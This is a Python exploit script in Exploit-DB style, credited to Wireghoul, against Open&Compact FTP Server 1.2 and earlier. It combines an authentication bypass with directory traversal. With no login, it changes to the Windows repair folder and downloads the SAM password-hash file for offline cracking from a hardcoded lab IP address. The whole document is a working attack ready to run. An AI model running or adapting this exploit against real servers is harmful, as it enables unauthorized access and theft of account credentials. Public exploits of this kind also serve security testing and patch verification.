#!/usr/bin/python
# Exploit Title: Open&Compact Ftp Server <= 1.2 Auth bypass & directory traversal sam retrieval
# Date: Aug 7, 2013
# By Wireghoul - http://www.justanotherhacker.com
# Based on Serge Gorbunov's auth bypass (http://www.exploit-db.com/exploits/13932/)
# Software Link: http://sourceforge.net/projects/open-ftpd/
# Version: <= 1.2
# Tested on: Windows 7, Windows XP SP3

# Abusing authentication bypass in combination with a directory traversal to grab
# the sam file for offline cracking

import ftplib
import os

# Connect to server

ftp = ftplib.FTP( "192.168.58.135" )
ftp.set_pasv( False )

# Note that we need no authentication at all!!

print ftp.sendcmd( 'CWD C:\\\\windows\\\\repair\\\\' )
print ftp.retrbinary('RETR sam', open('sam', 'wb').write )

ftp.quit()